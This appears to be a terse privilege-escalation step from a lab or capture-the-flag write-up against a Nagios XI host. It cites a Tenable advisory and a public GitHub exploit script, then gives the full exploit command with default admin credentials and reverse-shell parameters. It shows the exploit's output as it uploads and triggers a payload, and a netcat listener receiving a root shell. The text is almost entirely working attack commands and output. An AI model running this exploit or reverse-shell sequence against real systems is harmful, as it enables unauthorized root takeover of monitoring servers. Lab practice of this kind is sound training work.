# 4 privesc

```
https://www.tenable.com/security/research/tra-2020-61

Using https://github.com/jakgibb/nagiosxi-root-rce-exploit/blob/master/exploit.php

$ php exploit.php --host=192.168.200.136 --ssl=false --user=nagiosadmin --pass=admin --reverseip=192.168.49.200 --reverseport=6969
[+] Grabbing NSP from: http://192.168.200.136/nagiosxi/login.php
[+] Retrieved page contents from: http://192.168.200.136/nagiosxi/login.php
[+] Extracted NSP - value: 7b7abcfcff3442a03f73a77a3aa903dfc3519f1fd55a3c2bfe9ead4c33187ace
[+] Attempting to login...
[+] Authentication success
[+] Checking we have admin rights...
[+] Admin access confirmed
[+] Grabbing NSP from: http://192.168.200.136/nagiosxi/admin/monitoringplugins.php
[+] Retrieved page contents from: http://192.168.200.136/nagiosxi/admin/monitoringplugins.php
[+] Extracted NSP - value: 16dfa5ad3ca4bfdfce444370eb497456b492f24480557c03900e351e17f74f80
[+] Uploading payload...
[+] Payload uploaded
[+] Triggering payload: if successful, a reverse shell will spawn at 192.168.49.200:6969


$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.200] from (UNKNOWN) [192.168.200.136] 54516
bash: cannot set terminal process group (959): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# whoami;id
whoami;id
root
```
